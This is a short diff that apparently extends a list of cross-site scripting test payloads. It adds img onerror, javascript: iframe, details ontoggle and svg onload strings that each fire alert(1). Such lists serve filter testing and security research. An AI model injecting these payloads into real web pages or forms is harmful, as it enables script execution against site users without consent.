@@ -1,2 +1,6 @@
 data:text/html,<img src=1 onerror=alert(1)>
 data:text/html,<iframe src=javascript:alert(1)>
+<img src=1 onerror=alert(1)>
+<iframe src=javascript:alert(1)>
+<details open ontoggle=alert(1)>
+<svg><svg onload=alert(1)>
